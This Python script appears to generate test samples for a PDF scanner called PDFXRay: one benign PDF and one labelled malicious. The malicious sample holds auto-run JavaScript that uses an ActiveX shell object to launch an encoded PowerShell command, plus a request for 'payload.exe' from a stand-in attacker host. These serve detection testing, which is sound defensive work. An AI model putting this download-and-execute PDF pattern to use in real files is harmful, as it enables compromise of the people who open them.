#!/usr/bin/env python3
"""
PDFXRay - Test Sample Creator for Windows
"""

import os

def create_malicious_pdf():
    content = b"""%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /AA << /O << /S /JavaScript /JS (app.alert("PDFXRay Test");) >> >>
>>
endobj

4 0 obj
<< /Type /Action /S /JavaScript /JS (
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "http://malicious.example.com/payload.exe", false);
    xhttp.send();
) >>
endobj

5 0 obj
<< /S /JavaScript /JS (
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("cmd.exe /c powershell -enc dwB3AGgAbwBhAG0AaQA=");
) >>
endobj

6 0 obj
<< /Type /EmbeddedFile /F (payload.exe) >>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000063 00000 n 
0000000126 00000 n 
0000000255 00000 n 
0000000400 00000 n 
0000000500 00000 n 

trailer
<< /Size 7 /Root 1 0 R >>
startxref
600
%%EOF"""
    
    os.makedirs('samples', exist_ok=True)
    filepath = os.path.join('samples', 'malicious_sample.pdf')
    
    with open(filepath, 'wb') as f:
        f.write(content)
    
    print(f"[+] Created: {filepath}")
    print(f"    Indicators: OpenAction, JavaScript, EmbeddedFile, ActiveX")

def create_benign_pdf():
    content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Hello from PDFXRay) Tj ET
endstream
endobj

5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000063 00000 n 
0000000126 00000 n 
0000000240 00000 n 
0000000340 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
410
%%EOF"""
    
    os.makedirs('samples', exist_ok=True)
    filepath = os.path.join('samples', 'benign_sample.pdf')
    
    with open(filepath, 'wb') as f:
        f.write(content)
    
    print(f"[+] Created: {filepath}")
    print(f"    Type: Benign (clean)")

if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("PDFXRay - Sample Creator")
    print("=" * 50)
    create_malicious_pdf()
    create_benign_pdf()
    print("\n✅ Samples created in 'samples/' folder")